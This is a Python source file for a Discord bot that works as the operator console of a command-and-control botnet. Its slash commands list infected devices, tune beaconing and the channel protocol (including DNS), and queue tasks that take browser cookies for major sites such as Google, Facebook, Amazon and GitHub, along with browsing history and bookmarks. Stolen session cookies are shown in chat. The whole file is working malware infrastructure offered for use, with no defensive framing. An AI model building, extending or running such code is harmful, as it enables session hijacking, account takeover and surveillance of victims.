"""
Discord bot entry point.
Uses slash commands (app_commands) with autocomplete for a better UX,
and logs every command invocation to the terminal for tracking.

Commands are forwarded to the C2 server via HTTP. If the server is
offline, the bot falls back to standalone/demo mode.
"""

import logging
from typing import Any

import discord
from discord import app_commands
from discord.ext import commands

import httpx

from config import (
    ADMIN_DISCORD_ID,
    C2_SERVER_URL,
    COMMAND_PREFIX,
    DISCORD_BOT_TOKEN,
    VALID_BEACON_INTERVALS,
    VALID_COMMUNICATION_PROTOCOLS,
)
from devices import DeviceManager

# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("discord-bot")

# ---------------------------------------------------------------------------
# Bot setup
# ---------------------------------------------------------------------------

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
device_manager = DeviceManager()

# ---------------------------------------------------------------------------
# HTTP bridge to C2 server
# ---------------------------------------------------------------------------


async def call_server(
    endpoint: str,
    method: str = "GET",
    json_body: dict[str, Any] | None = None,
) -> dict[str, Any] | None:
    """
    Call the C2 server via HTTP.
    Returns the response dict, or None if the server is unreachable.
    """
    url = f"{C2_SERVER_URL}{endpoint}"
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            if method == "POST":
                resp = await client.post(url, json=json_body)
            else:
                resp = await client.get(url)

            if resp.status_code >= 400:
                logger.warning(
                    "Server returned %d for %s %s",
                    resp.status_code,
                    method,
                    endpoint,
                )
                return None

            logger.info("Server response from %s %s: OK", method, endpoint)
            return resp.json()
    except httpx.ConnectError:
        logger.warning(
            "Server unreachable at %s — running in standalone mode",
            C2_SERVER_URL,
        )
        return None
    except Exception as exc:
        logger.error("Error calling server: %s", exc)
        return None


def format_server_devices(data: dict[str, Any]) -> str:
    """Format a /admin/devices response into a Discord-friendly string."""
    devices = data.get("data", {}).get("devices", [])
    if not devices:
        return f"✅ {data.get('message', 'No devices found')}"

    lines = [f"✅ **Server Response — {data.get('message', '')}**"]
    for d in devices:
        status_emoji = "🟢" if d["status"] == "online" else "🔴"
        lines.append(
            f"{status_emoji} **{d['name']}** — "
            f"IP: `{d['ip']}` — Status: {d['status']}"
        )
    return "\n".join(lines)


def format_server_cookies(data: dict[str, Any]) -> str:
    """Format a /admin/cookies response into a Discord-friendly string."""
    cookies = data.get("data", {}).get("cookies_by_device", {})
    if not cookies:
        return f"✅ {data.get('message', 'No cookies found')}"

    lines = [f"✅ **Server Response — {data.get('message', '')}**"]
    for device_name, device_cookies in cookies.items():
        for cname, cvalue in device_cookies.items():
            lines.append(f"🍪 `{device_name}` → `{cname}` = `{cvalue}`")
    return "\n".join(lines)


def format_server_simple(data: dict[str, Any]) -> str:
    """Format a simple success/error response."""
    status = data.get("status", "unknown")
    message = data.get("message", "")
    emoji = "✅" if status == "success" else "❌"
    return f"{emoji} {message}"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def is_admin_user(interaction: discord.Interaction) -> bool:
    """Check whether the interaction author is the authorised admin."""
    return interaction.user.id == ADMIN_DISCORD_ID


def log_command(
    interaction: discord.Interaction,
    command_name: str,
    args: str = "",
) -> None:
    """Log a command invocation to the terminal."""
    user = interaction.user
    guild = interaction.guild
    channel = interaction.channel

    guild_name = guild.name if guild else "DM"
    channel_name = getattr(channel, "name", "unknown")

    args_display = f" ({args})" if args else ""
    logger.info(
        "Command /%s%s executed by %s (ID: %s) in #%s @ %s",
        command_name,
        args_display,
        user,
        user.id,
        channel_name,
        guild_name,
    )


def log_access_denied(interaction: discord.Interaction, command_name: str) -> None:
    """Log a denied access attempt to the terminal."""
    user = interaction.user
    logger.warning(
        "ACCESS DENIED: /%s attempted by %s (ID: %s)",
        command_name,
        user,
        user.id,
    )


# ---------------------------------------------------------------------------
# Events
# ---------------------------------------------------------------------------

@bot.event
async def on_ready() -> None:
    """Sync slash commands and log when the bot connects."""
    try:
        synced = await bot.tree.sync()
        logger.info(
            "Bot connected as %s (ID: %s) — synced %d slash command(s)",
            bot.user,
            bot.user.id,  # type: ignore[union-attr]
            len(synced),
        )
    except Exception as e:
        logger.error("Failed to sync commands: %s", e)

    # Check server connectivity.
    health = await call_server("/health")
    if health:
        logger.info("C2 server is reachable — server bridge active")
    else:
        logger.warning("C2 server is not reachable — standalone mode")

    logger.info("Waiting for commands...")


# ---------------------------------------------------------------------------
# Autocomplete callbacks
# ---------------------------------------------------------------------------

async def beacon_interval_autocomplete(
    interaction: discord.Interaction,
    current: str,
) -> list[app_commands.Choice[int]]:
    """Provide autocomplete options for beacon interval values."""
    return [
        app_commands.Choice(name=f"{val} seconds", value=val)
        for val in VALID_BEACON_INTERVALS
        if current == "" or str(val).startswith(current)
    ]


async def protocol_autocomplete(
    interaction: discord.Interaction,
    current: str,
) -> list[app_commands.Choice[str]]:
    """Provide autocomplete options for communication protocols."""
    return [
        app_commands.Choice(name=proto, value=proto)
        for proto in VALID_COMMUNICATION_PROTOCOLS
        if current == "" or proto.startswith(current.lower())
    ]


# ---------------------------------------------------------------------------
# Slash Commands
# ---------------------------------------------------------------------------

@bot.tree.command(
    name="show-devices",
    description="Display all managed devices and their status.",
)
async def show_devices(interaction: discord.Interaction) -> None:
    """Send the list of managed devices to the channel."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "show-devices")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "show-devices")

    # Try server first, fall back to local.
    server_response = await call_server("/admin/devices")
    if server_response:
        response = format_server_devices(server_response)
    else:
        response = device_manager.show_devices()

    await interaction.response.send_message(response)


@bot.tree.command(
    name="set-beacon-interval",
    description="Set the beacon interval. Valid values: 2, 4, 8, 16, 32.",
)
@app_commands.autocomplete(interval=beacon_interval_autocomplete)
@app_commands.describe(interval="Beacon interval in seconds (2, 4, 8, 16, or 32)")
async def set_beacon_interval(
    interaction: discord.Interaction,
    interval: int,
) -> None:
    """Set the beacon interval to the provided value."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "set-beacon-interval")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "set-beacon-interval", f"interval={interval}")

    server_response = await call_server(
        "/admin/beacon-interval", method="POST", json_body={"interval": interval}
    )
    if server_response:
        response = format_server_simple(server_response)
    else:
        response = device_manager.set_beacon_interval(interval)

    await interaction.response.send_message(response)


@bot.tree.command(
    name="request-cookies",
    description="Show cached cookies and queue a fresh cookie request for all devices.",
)
async def request_cookies(interaction: discord.Interaction) -> None:
    """Show cached cookies from the server and queue a fresh exfiltration task."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "request-cookies")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "request-cookies")

    # High-value domains matching the client's DEFAULT_COOKIE_DOMAINS
    high_value_domains = (
        "https://www.google.com,"
        "https://accounts.google.com,"
        "https://www.facebook.com,"
        "https://www.amazon.com,"
        "https://twitter.com,"
        "https://www.instagram.com,"
        "https://www.reddit.com,"
        "https://github.com,"
        "https://www.linkedin.com,"
        "https://www.netflix.com"
    )

    # Part 1: Show cached cookies from the server
    server_response = await call_server("/admin/cookies")
    if server_response:
        cached_section = format_server_cookies(server_response)
    else:
        cached_section = device_manager.request_cookies()

    # Part 2: Queue a fresh request-cookies task for all devices
    queue_response = await call_server(
        "/admin/queue-task",
        method="POST",
        json_body={
            "device_name": "*",
            "task_type": "request-cookies",
            "parameters": {"domains": high_value_domains},
        },
    )
    if queue_response:
        queue_section = (
            f"\n📡 **Fresh cookie request queued.**\n"
            f"> {format_server_simple(queue_response)}\n"
            f"> Results will arrive on the next beacon cycle."
        )
    else:
        queue_section = (
            "\n📡 **Fresh cookie request could not be queued** — server unreachable."
        )

    response = f"{cached_section}\n{queue_section}"
    await interaction.response.send_message(response)


@bot.tree.command(
    name="set-communication-protocol",
    description="Set the communication protocol. Valid: http, https, dns.",
)
@app_commands.autocomplete(protocol=protocol_autocomplete)
@app_commands.describe(protocol="Protocol to use (http, https, or dns)")
async def set_communication_protocol(
    interaction: discord.Interaction,
    protocol: str,
) -> None:
    """Set the communication protocol to the provided value."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "set-communication-protocol")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "set-communication-protocol", f"protocol={protocol}")

    server_response = await call_server(
        "/admin/communication-protocol",
        method="POST",
        json_body={"protocol": protocol},
    )
    if server_response:
        response = format_server_simple(server_response)
    else:
        response = device_manager.set_communication_protocol(protocol)

    await interaction.response.send_message(response)


@bot.tree.command(
    name="request-history",
    description="Request browsing history from a device (or all devices).",
)
@app_commands.describe(device="Target device name (or '*' for all devices)")
async def request_history(
    interaction: discord.Interaction,
    device: str = "*",
) -> None:
    """Queue a history exfiltration task for a target device."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "request-history")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "request-history", f"device={device}")

    server_response = await call_server(
        "/admin/queue-task",
        method="POST",
        json_body={
            "device_name": device,
            "task_type": "request-history",
            "parameters": {},
        },
    )
    if server_response:
        response = format_server_simple(server_response)
    else:
        response = "❌ Server unreachable — cannot queue tasks in standalone mode."

    await interaction.response.send_message(response)


@bot.tree.command(
    name="request-bookmarks",
    description="Request bookmarks from a device (or all devices).",
)
@app_commands.describe(device="Target device name (or '*' for all devices)")
async def request_bookmarks(
    interaction: discord.Interaction,
    device: str = "*",
) -> None:
    """Queue a bookmark exfiltration task for a target device."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "request-bookmarks")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "request-bookmarks", f"device={device}")

    server_response = await call_server(
        "/admin/queue-task",
        method="POST",
        json_body={
            "device_name": device,
            "task_type": "request-bookmarks",
            "parameters": {},
        },
    )
    if server_response:
        response = format_server_simple(server_response)
    else:
        response = "❌ Server unreachable — cannot queue tasks in standalone mode."

    await interaction.response.send_message(response)


# ---------------------------------------------------------------------------
# Task queue autocomplete
# ---------------------------------------------------------------------------

VALID_TASK_TYPES = [
    "request-cookies",
    "request-history",
    "request-bookmarks",
]


async def task_type_autocomplete(
    interaction: discord.Interaction,
    current: str,
) -> list[app_commands.Choice[str]]:
    """Provide autocomplete options for task types."""
    return [
        app_commands.Choice(name=t, value=t)
        for t in VALID_TASK_TYPES
        if current == "" or t.startswith(current.lower())
    ]


async def device_name_autocomplete(
    interaction: discord.Interaction,
    current: str,
) -> list[app_commands.Choice[str]]:
    """Provide autocomplete options for device names (fetched from server)."""
    choices = [app_commands.Choice(name="* (all devices)", value="*")]
    server_response = await call_server("/admin/devices")
    if server_response:
        devices = server_response.get("data", {}).get("devices", [])
        for d in devices:
            name = d["name"]
            if current == "" or name.startswith(current.lower()):
                choices.append(app_commands.Choice(name=name, value=name))
    return choices[:25]  # Discord limit


# ---------------------------------------------------------------------------
# Task queue commands
# ---------------------------------------------------------------------------

@bot.tree.command(
    name="queue-task",
    description="Queue a task for a device. Use '*' for all devices.",
)
@app_commands.autocomplete(device=device_name_autocomplete, task_type=task_type_autocomplete)
@app_commands.describe(
    device="Target device name (or '*' for all devices)",
    task_type="Type of task to queue (request-cookies, request-history, request-bookmarks)",
    parameters="Optional JSON parameters for the task",
)
async def queue_task(
    interaction: discord.Interaction,
    device: str,
    task_type: str,
    parameters: str = "{}",
) -> None:
    """Queue a C2 task for a target device via the server."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "queue-task")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "queue-task", f"device={device}, type={task_type}")

    import json
    try:
        params = json.loads(parameters)
    except json.JSONDecodeError:
        await interaction.response.send_message(
            "❌ Invalid JSON in parameters. Example: `{\"domains\": \"google.com\"}`",
            ephemeral=True,
        )
        return

    server_response = await call_server(
        "/admin/queue-task",
        method="POST",
        json_body={
            "device_name": device,
            "task_type": task_type,
            "parameters": params,
        },
    )
    if server_response:
        response = format_server_simple(server_response)
    else:
        response = "❌ Server unreachable — cannot queue tasks in standalone mode."

    await interaction.response.send_message(response)


@bot.tree.command(
    name="pending-tasks",
    description="Show all pending tasks across all devices.",
)
async def pending_tasks(interaction: discord.Interaction) -> None:
    """Show pending task counts per device."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "pending-tasks")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "pending-tasks")

    server_response = await call_server("/admin/pending-tasks")
    if server_response:
        pending = server_response.get("data", {}).get("pending_by_device", {})
        if not pending:
            response = "✅ No pending tasks."
        else:
            lines = [f"📋 **Pending Tasks**"]
            for dev, count in pending.items():
                lines.append(f"  📱 **{dev}** — {count} task(s)")
            response = "\n".join(lines)
    else:
        response = "❌ Server unreachable — cannot check pending tasks."

    await interaction.response.send_message(response)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    bot.run(DISCORD_BOT_TOKEN)

